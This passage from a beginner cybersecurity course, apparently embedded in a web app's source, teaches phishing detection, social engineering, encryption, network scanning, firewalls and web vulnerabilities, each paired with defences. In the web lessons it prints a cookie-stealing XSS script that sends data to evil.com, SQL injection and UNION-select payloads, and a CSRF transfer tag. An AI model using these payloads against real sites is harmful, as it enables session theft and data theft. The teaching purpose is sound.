Fake:  https://google-accounts-login.com  ← wrong domain!
Fake:  https://accounts.google.com.evil.com/login ← subdomain trick!
\`\`\`

**URL Anatomy:**
\`\`\`
https://accounts.google.com.evil.com/login
         ↑                    ↑
    looks legit          ACTUAL domain is evil.com!
\`\`\`

<warning>
⚠️ Always check the ACTUAL domain — it's the part right before .com/.org/.net!
</warning>

### How to Check a Suspicious Email

\`\`\`
1. Don't click any links!
2. Check the sender's FULL email address
3. Hover over links to see real URL
4. Look for urgency/fear tactics
5. When in doubt, go directly to the website
   (type it yourself, don't click the link)
\`\`\`

### Phishing Quiz

Which URL is real?

\`\`\`
A) https://www.paypal.com/login
B) https://www.paypa1.com/login
C) https://paypal.secure-login.com
D) https://www.paypal.com.verify.net/login
\`\`\`

Answer: **A** — it's the only one with the real paypal.com domain!

<tip>
💡 When in doubt, NEVER click email links. Open your browser and type the website address yourself!
</tip>

### Social Media Phishing

Hackers use info from your profiles to make convincing attacks:

\`\`\`
Public info they find:
- Your school name
- Your pet's name
- Your birthday
- Your friends list
- Where you work

They use this to:
- Guess security questions
- Create targeted phishing
- Impersonate your friends
\`\`\`

### Checking Links Safely

\`\`\`
BEFORE CLICKING any link:

1. HOVER over it to see the real URL
   Display: "Click to verify your account"
   Real URL: http://faceb00k-verify.suspicious.com
                     ^^^^^^ NOT facebook.com!

2. Check the domain carefully:
   ✅ facebook.com
   ✅ login.facebook.com (subdomain of facebook.com)
   ❌ facebook.suspicious.com (subdomain of suspicious.com!)
   ❌ facebo0k.com (zero instead of 'o')
   ❌ facebook-login.com (totally different domain)

3. Use VirusTotal to scan suspicious links:
   virustotal.com — paste the URL, it scans with 70+ antivirus engines
\`\`\`

### URL Anatomy for Security

\`\`\`
https://www.example.com:443/path/page?query=value#section
  │       │     │        │    │    │       │         │
  │       │     │        │    │    │       │         └── Fragment
  │       │     │        │    │    │       └── Query string
  │       │     │        │    │    └── Page
  │       │     │        │    └── Path
  │       │     │        └── Port (443 = HTTPS default)
  │       │     └── Domain (THIS IS WHAT MATTERS!)
  │       └── Subdomain
  └── Protocol (https = secure)

RULE: Always check the DOMAIN, not the subdomain or path.
paypal.com/login       → Real PayPal ✅
login.paypal.com       → Real PayPal ✅
paypal.login.evil.com  → NOT PayPal! ❌ (domain is evil.com)
\`\`\`

### Email Header Analysis

\`\`\`
Most email clients let you view full headers:
Gmail: Open email → ⋮ → "Show original"

KEY HEADERS TO CHECK:
From: security@paypal.com        → Displayed sender (EASILY FAKED!)
Return-Path: attacker@evil.com   → Actual return address
Received: from mail.evil.com     → Actual sending server
SPF: FAIL                        → Sender not authorized!
DKIM: FAIL                       → Signature doesn't match!

If SPF or DKIM fail → likely phishing!
\`\`\`

\`\`\`python
# Python script to check if a domain has SPF/DKIM
import dns.resolver

def check_email_security(domain):
    """Check if a domain has email security records."""
    try:
        # Check SPF record
        spf = dns.resolver.resolve(domain, 'TXT')
        for record in spf:
            if 'spf' in str(record).lower():
                print(f"SPF found: {record}")
    except:
        print("No SPF record found! ⚠️")
    
    try:
        # Check DMARC record
        dmarc = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
        for record in dmarc:
            print(f"DMARC found: {record}")
    except:
        print("No DMARC record found! ⚠️")

check_email_security("google.com")
\`\`\`

### Phishing Simulation Exercise

\`\`\`
Can you spot which emails are phishing? (Answers below)

EMAIL 1:
From: support@amazon.com
Subject: Your order #302-4857123 has shipped
"Hi John, your order will arrive Tuesday."
[Track Package]

EMAIL 2:
From: security@amaz0n-verify.com
Subject: URGENT: Verify your account NOW!
"Dear Customer, click below or lose access in 24h!"
[Verify Identity]

EMAIL 3:
From: hr@company.com
Subject: Updated PTO Policy
"Please review the new PTO policy document attached."
[Open PDF]

ANSWERS:
Email 1: ✅ Likely legitimate (uses your name, real domain)
Email 2: 🚩 PHISHING (fake domain, urgency, generic greeting)
Email 3: ⚠️ Could be either! Verify with HR directly.
\`\`\`

Stay skeptical! If something feels off, it probably is. 🎯
          `},{id:"3-2",title:"Social Engineering Tactics",duration:"10 min",content:`
## Hacking Without Code 🧠

**Social engineering** is manipulating people into breaking security. No code needed!

### The 6 Principles of Influence

Hackers exploit these psychological principles:

**1. Authority**
\`\`\`
"Hi, I'm from the IT department. I need your 
password to fix a critical issue."
→ People obey authority figures
\`\`\`

**2. Urgency**
\`\`\`
"Your account will be deleted in 1 HOUR unless 
you verify RIGHT NOW!"
→ Panic overrides critical thinking
\`\`\`

**3. Social Proof**
\`\`\`
"Everyone in your department has already updated 
their passwords using this link."
→ If others did it, it must be safe
\`\`\`

**4. Reciprocity**
\`\`\`
"I helped fix your computer last week, remember? 
I just need a small favor..."
→ We feel obligated to return favors
\`\`\`

**5. Liking**
\`\`\`
"Hey! We met at the conference, right? Great 
presentation! By the way..."
→ We trust people we like
\`\`\`

**6. Scarcity**
\`\`\`
"Only the first 10 people get free access! 
Click now before it's gone!"
→ Fear of missing out
\`\`\`

### Real Attack: Tailgating

Following someone through a locked door:

\`\`\`
*Employee badges into building*
Hacker: "Oh hey, can you hold the door? 
         My hands are full!" 📦
Employee: "Sure!"
Hacker: *walks right into secure building*
\`\`\`

### Real Attack: Pretexting

Creating a fake scenario:

\`\`\`
Hacker calls reception:
"Hi, I'm from Cisco doing a network audit. 
I need the admin password for router 
configuration check."

Receptionist: "Oh, let me ask... 
The admin password is 'cisco123'"
\`\`\`

### Real Attack: Baiting

Leaving infected USB drives in parking lots:

\`\`\`
*Employee finds USB labeled "Salary Data 2024"*
Employee: "Ooh, interesting!" *plugs it in*
USB: *installs malware* 😈
\`\`\`

<warning>
⚠️ NEVER plug in USB drives you find! They could contain malware that runs automatically.
</warning>

### Real Attack: Quid Pro Quo

\`\`\`
Hacker calls employees randomly:
"Hi, I'm tech support. Are you having 
any computer problems?"

Employee: "Actually, yes! My email is slow."

Hacker: "I can fix that! Just install this 
remote access tool and give me your login..."
\`\`\`

### Defense Strategies

\`\`\`
✅ Verify identity independently
   (Call them back on a known number)

✅ Never give passwords over phone/email
   (IT will NEVER ask for your password)

✅ Question urgency
   ("Let me verify this first")

✅ Be suspicious of unsolicited help

✅ Report suspicious contacts
\`\`\`

<tip>
💡 The best defense against social engineering is awareness. Now that you know these tricks, they're much less likely to work on you!
</tip>

### Try This: Social Engineering Awareness

Next time you get a suspicious email or message:
1. Identify which principle(s) of influence it uses
2. Find the red flags
3. Think about what the attacker wants

Practice makes you harder to hack! 🛡️

### Deepfakes & AI Social Engineering

\`\`\`
NEW THREAT: AI-powered social engineering

Voice Cloning:
  - 3 seconds of audio → convincing voice clone
  - "Hi, this is your boss. Transfer $50,000 to..."
  - Happened to a UK energy company ($243,000 stolen!)

Video Deepfakes:
  - Realistic fake video calls
  - CEO "appears" on Zoom asking for action
  - Hard to detect in real-time

AI-Written Phishing:
  - ChatGPT writes perfect English (no more grammar errors!)
  - Personalized at scale
  - Nearly impossible to spot by language alone

DEFENSE:
  ├── Verify voice/video requests through another channel
  ├── Use code words for sensitive operations
  ├── Be skeptical of urgent requests (even from "bosses")
  ├── Call back on a KNOWN number (not one provided)
  └── Multi-person approval for financial transfers
\`\`\`

### Physical Security Awareness

\`\`\`
PHYSICAL ATTACKS (often overlooked!):

Shoulder Surfing:
  Watching someone type their password
  Defense: Screen privacy filters, awareness

Dumpster Diving:
  Going through trash for sensitive documents
  Defense: Shred everything with sensitive info

Tailgating:
  Following authorized person through secure door
  Defense: Always verify, never hold door for strangers

Evil Maid Attack:
  Physical access to unattended laptop
  Defense: Full disk encryption, lock screen, never leave unattended

USB Drop Attack:
  "Found" USB drives with malware
  Defense: NEVER plug in unknown USB devices
\`\`\`

<warning>
⚠️ Physical security is the most overlooked attack vector. The fanciest firewall can't stop someone who walks through the front door!
</warning>

Practice makes you harder to hack! 🛡️
          `}]},{id:4,title:"Encryption & Cryptography",description:"The math that keeps secrets safe",lessons:[{id:"4-1",title:"Encryption Basics",duration:"12 min",content:`
## Secret Messages 🔐

Encryption turns readable text into unreadable gibberish — and back again!

### Plaintext vs Ciphertext

\`\`\`
Plaintext:  "HELLO WORLD"     (readable)
     ↓ Encrypt with key
Ciphertext: "KHOOR ZRUOG"     (gibberish)
     ↓ Decrypt with key
Plaintext:  "HELLO WORLD"     (readable again!)
\`\`\`

### Caesar Cipher (The Oldest Encryption)

Shift each letter by N positions:

\`\`\`
Key: Shift by 3

A → D    H → K
B → E    E → H
C → F    L → O
...      O → R

HELLO → KHOOR
\`\`\`

\`\`\`python
# Caesar Cipher in Python
def caesar_encrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base + shift) % 26 + base)
        else:
            result += char
    return result

# Encrypt
secret = caesar_encrypt("HELLO WORLD", 3)
print(secret)  # KHOOR ZRUOG

# Decrypt (shift backwards)
original = caesar_encrypt(secret, -3)
print(original)  # HELLO WORLD
\`\`\`

### Why Caesar Cipher is Weak

Only 26 possible shifts — try them all!

\`\`\`
KHOOR → shift 1  → JGNNQ  ✗
KHOOR → shift 2  → IFMMP  ✗
KHOOR → shift 3  → HELLO  ✓ Found it!
\`\`\`

### Symmetric Encryption

Same key to encrypt AND decrypt:

\`\`\`
    Key: "mysecretkey"
         ↓
Alice ──[Encrypt]──→ Ciphertext ──[Decrypt]──→ Bob
         ↑                                      ↑
    Uses same key                          Uses same key
\`\`\`

Modern symmetric algorithms:
- **AES** (Advanced Encryption Standard) — The gold standard
- **ChaCha20** — Fast, used in HTTPS

### Asymmetric Encryption (Public Key)

TWO different keys — a public key and a private key:

\`\`\`
Bob has:
  🔑 Public Key  (shared with everyone)
  🗝️ Private Key (kept secret!)

Alice wants to send Bob a message:
  1. Alice encrypts with Bob's PUBLIC key
  2. Only Bob's PRIVATE key can decrypt it!
\`\`\`

\`\`\`
Alice: "Hey Bob!" 
  → Encrypt with Bob's 🔑 Public Key
  → "x8k2m9p..."
  → Send to Bob

Bob receives: "x8k2m9p..."
  → Decrypt with 🗝️ Private Key  
  → "Hey Bob!"

Hacker intercepts: "x8k2m9p..."
  → Has no private key
  → Can't decrypt! 🔒
\`\`\`

### Real-World Uses

| Where | Encryption Used |
|-------|----------------|
| HTTPS websites | TLS (asymmetric + symmetric) |
| WhatsApp | Signal Protocol (end-to-end) |
| Bitcoin | Elliptic Curve Cryptography |
| Wi-Fi (WPA3) | AES encryption |
| File storage | AES-256 |

<tip>
💡 When you see HTTPS, your browser and the server did an asymmetric key exchange, then switched to faster symmetric encryption for the actual data!
</tip>

### Hashing vs Encryption

\`\`\`
Encryption: Plaintext ←→ Ciphertext (reversible!)
Hashing:    Plaintext  →  Hash      (one-way only!)
\`\`\`

Hashing is used for passwords — the website never needs to get your password back, just check if it matches!

### Common Encryption Algorithms

\`\`\`
SYMMETRIC (same key encrypts/decrypts):
├── AES-256    → Gold standard, used everywhere
├── AES-128    → Slightly faster, still very secure
├── ChaCha20   → Fast on mobile, used by Google
└── (OLD) DES  → BROKEN, never use!

ASYMMETRIC (public/private key pair):
├── RSA-2048   → Most common, proven secure
├── RSA-4096   → Extra security, slower
├── Ed25519    → Modern, fast, smaller keys
└── ECDSA      → Used in Bitcoin, TLS

HASHING (one-way, for verification):
├── SHA-256    → Standard, used in Bitcoin
├── SHA-3      → Newest standard
├── bcrypt     → For passwords (slow = good!)
├── Argon2     → Best for passwords
└── (OLD) MD5  → BROKEN, never use for security!
\`\`\`

<warning>
⚠️ Never use MD5 or SHA-1 for security purposes — they have known collision vulnerabilities. Always use SHA-256 or better!
</warning>

### Digital Signatures

How do you know a message REALLY came from who it claims?

\`\`\`
SIGNING (sender):
Message → Hash → Encrypt hash with PRIVATE key → Signature

VERIFYING (receiver):
1. Decrypt signature with sender's PUBLIC key → Original hash
2. Hash the received message → New hash
3. Compare: Original hash == New hash?
   YES → Message is authentic and unmodified ✓
   NO  → Message was tampered with ✗
\`\`\`

\`\`\`python
# Conceptual digital signature
from hashlib import sha256

# Sender signs
message = "Send $100 to Alice"
message_hash = sha256(message.encode()).hexdigest()
signature = encrypt_with_private_key(message_hash)  # Only sender can do this

# Receiver verifies
received_hash = decrypt_with_public_key(signature)  # Anyone can verify
computed_hash = sha256(message.encode()).hexdigest()
is_authentic = received_hash == computed_hash
print(f"Message authentic: {is_authentic}")
\`\`\`

Understanding encryption is understanding the backbone of internet security! 🔐
          `},{id:"4-2",title:"HTTPS & Secure Communication",duration:"10 min",content:`
## How HTTPS Keeps You Safe 🔒

Every time you visit a website with 🔒, encryption is protecting you!

### The TLS Handshake

When you visit https://google.com:

\`\`\`
1. YOUR BROWSER → "Hello! I want a secure connection"
2. GOOGLE → "Here's my certificate + public key" 📜
3. YOUR BROWSER → Verifies certificate is legit
4. YOUR BROWSER → Generates a session key
5. YOUR BROWSER → Encrypts session key with Google's 
                  public key, sends it
6. GOOGLE → Decrypts with private key
7. BOTH → Now share the same session key!
8. ALL DATA → Encrypted with session key 🔒
\`\`\`

### Certificates — Proof of Identity

A certificate says: "I am really google.com"

\`\`\`
Certificate for: google.com
Issued by: Google Trust Services (CA)
Valid: Jan 2024 - Apr 2024
Public Key: [included]
Signature: [CA signed this]
\`\`\`

**Certificate Authorities (CAs)** are trusted organizations that verify identities. Your browser comes with a list of trusted CAs.

### What Happens Without HTTPS

On public Wi-Fi with HTTP:

\`\`\`
You → "My password is hunter2" → Wi-Fi → Website
                                   ↑
                              Hacker sees:
                         "My password is hunter2" 😱

With HTTPS:
You → "x8k2m9p4..." → Wi-Fi → Website
                         ↑
                    Hacker sees:
                  "x8k2m9p4..." 🤷
\`\`\`

### Man-in-the-Middle (MITM) Attack

\`\`\`
Normal:
You ←──────────→ Google

MITM Attack:
You ←────→ Hacker ←────→ Google
           (reads everything!)
\`\`\`

HTTPS prevents this because the hacker can't forge Google's certificate!

### Check a Site's Certificate

Click the 🔒 in your browser:
1. See who issued the certificate
2. Check if it's valid
3. View the encryption details

\`\`\`bash
# Check certificate from terminal
openssl s_client -connect google.com:443 -brief

# See certificate details
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -text
\`\`\`

### End-to-End Encryption (E2EE)

Apps like Signal and WhatsApp use E2EE:

\`\`\`
Regular encryption:
You → [Encrypted] → Server [DECRYPTED] → [Encrypted] → Friend
                     Server can read! 😰

End-to-End encryption:
You → [Encrypted] → Server [still encrypted] → Friend
                     Server can't read! ✅
\`\`\`

Only you and the recipient have the keys!

### VPNs — Your Encrypted Tunnel

\`\`\`
Without VPN:
You → ISP (sees everything) → Internet
      Your ISP knows every site you visit!

With VPN:
You → [Encrypted Tunnel] → VPN Server → Internet
      ISP sees only encrypted data!
      But... VPN server sees your traffic
\`\`\`

<warning>
⚠️ VPNs move trust, not remove it. You're trusting the VPN provider instead of your ISP. Choose carefully!
</warning>

<tip>
💡 Free VPNs often sell your data. If you're not paying, YOU are the product!
</tip>

### Wi-Fi Security Standards

\`\`\`
WEP (1999)  → BROKEN! Can be cracked in minutes
WPA (2003)  → BROKEN! Known vulnerabilities
WPA2 (2004) → Good, but KRACK attack found in 2017
WPA3 (2018) → Current best standard ✓

ALWAYS use WPA2 or WPA3 for your home Wi-Fi!
\`\`\`

### Public Wi-Fi Dangers

\`\`\`
RISKS of public Wi-Fi (coffee shops, airports):
├── Evil Twin Attack (fake hotspot with same name)
├── Packet Sniffing (reading unencrypted traffic)
├── Man-in-the-Middle (intercepting connections)
└── Session Hijacking (stealing login cookies)

PROTECTION:
├── Use HTTPS sites only
├── Use a VPN
├── Don't access banking/sensitive accounts
├── Turn off auto-connect to Wi-Fi networks
└── Forget the network when done
\`\`\`

### Tor — Anonymous Browsing

\`\`\`
How Tor works (The Onion Router):

Your traffic is encrypted in 3 layers:
You → Guard Node → Middle Node → Exit Node → Website

Each node only knows the previous and next hop:
Guard:  Knows YOU, but not the website
Middle: Knows nothing useful
Exit:   Knows the website, but not YOU

Like wrapping a letter in 3 envelopes:
Each relay opens one envelope, sees the next address,
but never the original sender AND the content together.
\`\`\`

<tip>
💡 Tor provides anonymity but is SLOW. Use it when privacy matters most, not for everyday browsing.
</tip>

Now you understand how encryption protects your data online! 🛡️
          `}]},{id:5,title:"Network Security",description:"Defend and analyze networks",lessons:[{id:"5-1",title:"Network Scanning & Reconnaissance",duration:"14 min",content:`
## Seeing What's on Your Network 🔍

Before you can defend a network, you need to know what's on it!

### What is Reconnaissance?

The first step in both hacking AND defending:
1. **What devices are connected?**
2. **What ports are open?**
3. **What services are running?**

### Nmap — The Network Scanner

**Nmap** is the most famous security scanning tool:

\`\`\`bash
# Scan your local network (find all devices)
nmap -sn 192.168.1.0/24

# Output:
# Host is up: 192.168.1.1    (Router)
# Host is up: 192.168.1.100  (Your PC)
# Host is up: 192.168.1.101  (Phone)
# Host is up: 192.168.1.105  (Smart TV)
\`\`\`

### Port Scanning

\`\`\`bash
# Scan a specific device for open ports
nmap 192.168.1.1

# Output:
# PORT    STATE  SERVICE
# 22/tcp  open   ssh
# 80/tcp  open   http
# 443/tcp open   https
# 8080/tcp open  http-proxy
\`\`\`

### Understanding Port States

| State | Meaning |
|-------|---------|
| **open** | Service is listening (accessible!) |
| **closed** | Port exists but no service |
| **filtered** | Firewall is blocking the scan |

### Wireshark — See ALL Network Traffic

**Wireshark** captures and displays every packet on your network:

\`\`\`
No. | Time    | Source          | Dest            | Protocol | Info
1   | 0.000   | 192.168.1.100  | 142.250.80.46  | TCP      | SYN
2   | 0.012   | 142.250.80.46  | 192.168.1.100  | TCP      | SYN-ACK
3   | 0.013   | 192.168.1.100  | 142.250.80.46  | TCP      | ACK
4   | 0.014   | 192.168.1.100  | 142.250.80.46  | TLS      | Client Hello
\`\`\`

### What You Can See in Wireshark

\`\`\`
✅ DNS queries (what sites devices visit)
✅ Unencrypted HTTP traffic
✅ Connection patterns
✅ Suspicious traffic
❌ HTTPS content (encrypted!)
❌ VPN traffic content
\`\`\`

### Netstat — Check Your Own Connections

\`\`\`bash
# See all active connections on your computer
netstat -an

# Windows: see which programs have connections
netstat -ab

# Mac/Linux: with process IDs
netstat -tulpn
# or
ss -tulpn
\`\`\`

<tip>
💡 If you see connections to IPs you don't recognize, it could be malware phoning home!
</tip>

### DNS Lookup Tools

\`\`\`bash
# Find IP of a domain
nslookup example.com

# Detailed DNS info
dig example.com

# Reverse lookup (IP → domain)
nslookup 8.8.8.8
# Result: dns.google
\`\`\`

### Traceroute — Follow the Path

See every router between you and a destination:

\`\`\`bash
# Mac/Linux
traceroute google.com

# Windows
tracert google.com

# Output:
# 1  192.168.1.1      (your router)
# 2  10.0.0.1         (ISP)
# 3  72.14.215.85     (backbone)
# 4  142.250.80.46    (Google!)
\`\`\`

### Practice: Scan Your Home Network

\`\`\`bash
# 1. Find your IP
ifconfig  # or ipconfig on Windows

# 2. Scan your network
nmap -sn 192.168.1.0/24

# 3. Count devices - do you recognize them all?
# Unknown devices = potential security issue!
\`\`\`

<warning>
⚠️ Only scan networks you OWN or have permission to scan. Scanning others' networks can be illegal!
</warning>

Knowing your network is the first step to defending it! 🔍
          `},{id:"5-2",title:"Firewalls & Defense",duration:"10 min",content:`
## Building Your Fortress 🏰

Now that you can see what's on a network, let's protect it!

### What is a Firewall?

A firewall is a gatekeeper that decides what traffic gets in and out:

\`\`\`
Internet → [FIREWALL] → Your Network
                ↓
        Rules decide:
        ✅ Allow web traffic (80, 443)
        ✅ Allow email (25, 587)
        ❌ Block everything else
\`\`\`

### Firewall Rules

Rules follow this format:
\`\`\`
ACTION  DIRECTION  PROTOCOL  PORT  SOURCE/DEST

ALLOW   INBOUND    TCP       443   Any → Server
ALLOW   OUTBOUND   TCP       80    Server → Any  
DENY    INBOUND    TCP       22    Any → Server
DENY    INBOUND    ALL       ALL   Any → Any (default)
\`\`\`

### Linux Firewall (iptables/ufw)

\`\`\`bash
# UFW (Uncomplicated Firewall) - easy mode!

# Enable firewall
sudo ufw enable

# Allow web server
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Allow SSH from specific IP only
sudo ufw allow from 192.168.1.100 to any port 22

# Block everything else (default)
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Check rules
sudo ufw status
\`\`\`

### Windows Firewall

\`\`\`
Settings → Windows Security → Firewall
- Domain networks: ON
- Private networks: ON
- Public networks: ON (most restrictive!)
\`\`\`

### Types of Firewalls

| Type | What It Does |
|------|-------------|
| **Packet Filter** | Checks each packet against rules |
| **Stateful** | Tracks connection states |
| **Application** | Understands HTTP, DNS, etc. |
| **Next-Gen (NGFW)** | Deep inspection + AI |

### Intrusion Detection (IDS) vs Prevention (IPS)

\`\`\`
IDS: "Hey, I saw something suspicious!" (alerts only)
IPS: "Suspicious traffic BLOCKED!" (takes action)
\`\`\`

### Network Segmentation

Don't put everything on one network!

\`\`\`
BAD (flat network):
[Server] - [PC] - [Smart TV] - [IoT Camera]
  ↑ If one gets hacked, hacker has access to ALL

GOOD (segmented):
[Server VLAN] | [Office VLAN] | [IoT VLAN]
  ↑ Hacked IoT camera can't reach the server!
\`\`\`

### Wi-Fi Security

| Protocol | Security | Status |
|----------|----------|--------|
| WEP | ❌ Broken | Never use |
| WPA | ⚠️ Weak | Avoid |
| WPA2 | ✅ Good | Current standard |
| WPA3 | ✅✅ Best | Use if available |

\`\`\`
Your Wi-Fi Checklist:
☐ WPA2 or WPA3 enabled
☐ Strong password (not "password123")
☐ Default router admin password changed
☐ WPS disabled (it's hackable!)
☐ Guest network for visitors
☐ Router firmware up to date
\`\`\`

<tip>
💡 Your router's admin page is usually at 192.168.1.1 or 192.168.0.1 — log in and check your security settings!
</tip>

### Defense in Depth

Don't rely on just one defense:

\`\`\`
Layer 1: Firewall (network perimeter)
Layer 2: Antivirus (endpoint protection)
Layer 3: Updates/Patches (close vulnerabilities)
Layer 4: Strong passwords + 2FA (access control)
Layer 5: Training (human awareness)
Layer 6: Backups (recovery plan)
\`\`\`

Multiple layers = much harder to hack! 🏰

### Honeypots — Trap the Attackers!

\`\`\`
A honeypot is a FAKE system designed to:
1. Detect attackers (early warning)
2. Distract from real systems
3. Study attacker techniques
4. Waste attacker time

Types:
├── Low-interaction: Simulates services (easy to set up)
├── Medium-interaction: Emulates OS/services 
└── High-interaction: Real systems (most realistic)

Example tools:
├── Cowrie (SSH/Telnet honeypot)
├── Dionaea (malware collection)
└── HoneyDB (web-based honeypot)
\`\`\`

\`\`\`bash
# Simple SSH honeypot with Cowrie
# Install Cowrie
git clone https://github.com/cowrie/cowrie.git
cd cowrie
pip install -r requirements.txt

# When hackers try to SSH in, Cowrie:
# - Records all commands they type
# - Captures any malware they upload
# - Logs their IP and techniques
# - Gives them a fake filesystem to explore

# All while your REAL server stays safe!
\`\`\`

### Log Analysis — Finding Intrusions

\`\`\`bash
# Real security work: analyzing log files

# Find failed SSH login attempts
grep "Failed password" /var/log/auth.log | tail -20

# Count failed logins per IP (find brute-force attacks)
grep "Failed password" /var/log/auth.log |   awk '{print $11}' | sort | uniq -c | sort -rn | head

# Output:
# 847 192.168.1.55    ← This IP tried 847 times! Block it!
#  23 10.0.0.42
#   3 192.168.1.100

# Find successful logins (verify they're legitimate)
grep "Accepted" /var/log/auth.log

# Web server: find 404 errors (directory enumeration)
grep "404" /var/log/apache2/access.log |   awk '{print $7}' | sort | uniq -c | sort -rn | head

# Output:
# 156 /admin          ← Someone looking for admin pages
#  89 /wp-login.php   ← WordPress attack
#  45 /.env           ← Trying to steal config files
\`\`\`

<tip>
💡 Security Information and Event Management (SIEM) tools like Splunk, ELK Stack, and Wazuh automate log analysis at enterprise scale. They're essential for Security Operations Centers (SOCs).
</tip>

### Zero Trust Security Model

\`\`\`
OLD MODEL (Castle and Moat):
  "Trust everything inside the network"
  Problem: Once inside, attackers move freely

NEW MODEL (Zero Trust):
  "Never trust, always verify"
  
  Principles:
  ├── Verify every user, every time
  ├── Verify every device, every time
  ├── Limit access to minimum needed
  ├── Monitor everything continuously
  └── Assume breach has already happened

  Implementation:
  ├── Multi-factor authentication everywhere
  ├── Micro-segmentation of networks
  ├── Continuous monitoring and logging
  ├── Least-privilege access policies
  └── Encrypt all traffic (even internal!)
\`\`\`

Multiple layers = much harder to hack! 🏰
          `}]},{id:6,title:"Web Security",description:"How websites get hacked",lessons:[{id:"6-1",title:"Common Web Vulnerabilities",duration:"14 min",content:`
## How Websites Get Hacked 🌐

Websites are one of the biggest attack targets. Let's learn how they break!

### SQL Injection (SQLi)

The #1 web vulnerability for decades!

Normal login:
\`\`\`sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
\`\`\`

Hacker enters this as username:
\`\`\`
' OR '1'='1' --
\`\`\`

The query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
\`\`\`

\`'1'='1'\` is always true → Returns ALL users → Hacker is logged in! 😱

### SQL Injection - Data Theft

\`\`\`sql
-- Hacker enters in search box:
' UNION SELECT username, password FROM users --

-- Returns all usernames and passwords!
\`\`\`

### Defense Against SQLi

\`\`\`python
# BAD - Vulnerable to SQL injection!
query = f"SELECT * FROM users WHERE name = '{user_input}'"

# GOOD - Parameterized query (safe!)
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (user_input,))
\`\`\`

<warning>
⚠️ NEVER put user input directly into SQL queries! Always use parameterized queries.
</warning>

### Cross-Site Scripting (XSS)

Injecting JavaScript into a website:

\`\`\`html
<!-- Hacker posts this as a comment: -->
<script>
  document.location = 'https://evil.com/steal?cookie=' 
    + document.cookie;
<\/script>

<!-- When other users view the comment, 
     their cookies get stolen! -->
\`\`\`

### Types of XSS

| Type | How It Works |
|------|-------------|
| **Stored XSS** | Malicious code saved in database (comments, profiles) |
| **Reflected XSS** | Code in URL, reflected back by server |
| **DOM XSS** | Manipulates page JavaScript directly |

### Defense Against XSS

\`\`\`python
# Escape HTML special characters
import html
safe_input = html.escape(user_input)
# <script> becomes &lt;script&gt; (won't execute!)
\`\`\`

\`\`\`
Content-Security-Policy: script-src 'self'
↑ Only allow scripts from your own domain!
\`\`\`

### Cross-Site Request Forgery (CSRF)

Trick logged-in users into performing actions:

\`\`\`html
<!-- On evil website: -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- Your browser sends the request WITH your 
     bank session cookie! -->
\`\`\`

Defense: **CSRF tokens** — random values that attackers can't guess.

### Insecure Direct Object References (IDOR)

\`\`\`
Your profile: https://site.com/user/profile?id=123
Change to:    https://site.com/user/profile?id=124
→ See someone else's profile! 😱
\`\`\`

Defense: Always check authorization on the server!

### The OWASP Top 10

The most critical web security risks:

1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQLi, XSS)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Data Integrity Failures
9. Security Logging Failures
10. Server-Side Request Forgery

<tip>
💡 The OWASP Top 10 is updated regularly and is the gold standard for web security awareness!
</tip>

### Practice: Try Hacking (Legally!)

Safe practice environments:
- **DVWA** (Damn Vulnerable Web App)
- **HackTheBox** (online challenges)
- **TryHackMe** (guided learning)
- **PortSwigger Web Security Academy** (free!)

These are LEGAL practice environments designed to be hacked! 🎯

### Secure Coding Principles

\`\`\`python
# PRINCIPLE 1: Never trust user input!
# Validate, sanitize, escape ALL input

# BAD:
user_input = request.args.get('name')
return f"Hello, {user_input}"  # XSS vulnerable!

# GOOD:
from markupsafe import escape
user_input = request.args.get('name')
return f"Hello, {escape(user_input)}"  # Safe!


# PRINCIPLE 2: Least privilege
# Give minimum permissions needed

# BAD: Running web server as root
# GOOD: Running as www-data user with limited access


# PRINCIPLE 3: Defense in depth
# Don't rely on just one security measure

# Layer 1: Input validation (client-side)
# Layer 2: Input validation (server-side)  
# Layer 3: Parameterized queries (database)
# Layer 4: Output encoding (display)
# Layer 5: Content Security Policy (browser)


# PRINCIPLE 4: Fail securely
# When something goes wrong, don't expose details

# BAD:
try:
    user = database.get_user(id)
except Exception as e:
    return f"Error: {e}"  # Exposes database details!

# GOOD:
try:
    user = database.get_user(id)
except Exception as e:
    log.error(f"Database error: {e}")  # Log internally
    return "An error occurred. Please try again."  # Generic message
\`\`\`

### HTTP Security Headers

\`\`\`
Essential security headers for your web server:

Content-Security-Policy: default-src 'self'
  → Prevents XSS by restricting script sources

X-Content-Type-Options: nosniff
  → Prevents MIME type sniffing attacks

X-Frame-Options: DENY
  → Prevents clickjacking (embedding in iframes)

Strict-Transport-Security: max-age=31536000
  → Forces HTTPS for one year

X-XSS-Protection: 1; mode=block
  → Browser's built-in XSS filter

Referrer-Policy: strict-origin-when-cross-origin
  → Controls what URL info is sent to other sites
\`\`\`

\`\`\`python
# Adding security headers in Flask/Python
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000'
    return response
\`\`\`

### File Upload Vulnerabilities

\`\`\`
ATTACK: Uploading a PHP shell disguised as an image

1. Hacker creates evil.php.jpg
2. Website only checks file extension (.jpg = allowed!)
3. Server executes the PHP code
4. Hacker has remote code execution! 😱

DEFENSES:
✅ Check MIME type (not just extension)
✅ Rename uploaded files
✅ Store outside web root
✅ Limit file types and sizes
✅ Scan for malware
✅ Don't execute uploaded files
\`\`\`

<warning>
⚠️ File upload is one of the most dangerous web features. If not properly secured, it can lead to complete server compromise!
</warning>
          `},{id:"6-2",title:"Securing Your Digital Life",duration:"10 min",content:`
## Your Personal Security Checklist ✅

Let's apply everything you've learned to protect YOUR digital life!

### Browser Security

\`\`\`
✅ Use HTTPS Everywhere (or browser's built-in)
✅ Block third-party cookies
✅ Use ad blocker (uBlock Origin)
✅ Don't save passwords in browser
   (use a password manager instead!)
